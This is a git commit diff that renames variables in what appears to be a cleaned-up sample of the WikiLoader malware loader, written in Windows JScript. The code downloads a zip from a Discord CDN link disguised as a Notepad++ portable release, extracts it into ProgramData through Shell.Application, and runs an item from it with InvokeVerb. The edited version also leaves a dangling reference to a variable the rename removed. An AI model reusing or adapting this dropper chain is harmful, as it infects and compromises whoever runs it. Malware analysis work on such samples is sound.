a401efa459f5d055c6d74d13e45f317757ad2df4
Soroush(Amirali) Rafie <66920260+Null-byte-00@users.noreply.github.com>
2024-01-18 18:05:38 +0330

    Update wikiloader_cleaned.js

--- wikiloader_cleaned.js
+++ wikiloader_cleaned.js
@@ -13,8 +13,8 @@ xhttp.onreadystatechange=function() {
 };
 xhttp.open("GET", "https://cdn.discordapp.com/attachments/1063900897270304770/1196763302303379496/npp.8.6.portable.x64.zip?ex=65b8cfae&is=65a65aae&hm=d30cc80d979d64493314348ac5a012ef68a7e030d08ec0360a636b7744b8f9b6&", false);
 xhttp.send(); 
-var xhttp = new ActiveXObject("Shell.Application");
-var xhttp_namespace=xhttp.NameSpace(programdata_folder+"7119faa4bbc81c657c224afb6ee97434.zip");
-var JIChAaSPKiqkpInjS=xhttp.NameSpace(programdata_folder).CopyHere(xhttp_namespace.Items(), 12);
-new ActiveXObject("WScript.Shell").CurrentDirectory=programdata_folder+xhttp_namespace.Items().Item(Math.log(1));
-xhttp.NameSpace(programdata_folder+xhttp_namespace.Items().Item(Math.log(1))).Items().Item(12).InvokeVerb();
+var shell = new ActiveXObject("Shell.Application");
+var shell_namespace=shell.NameSpace(programdata_folder+"7119faa4bbc81c657c224afb6ee97434.zip");
+shell.NameSpace(programdata_folder).CopyHere(xhttp_namespace.Items(), 12);
+new ActiveXObject("WScript.Shell").CurrentDirectory=programdata_folder+shell_namespace.Items().Item(Math.log(1));
+shell.NameSpace(programdata_folder+shell_namespace.Items().Item(Math.log(1))).Items().Item(12).InvokeVerb();
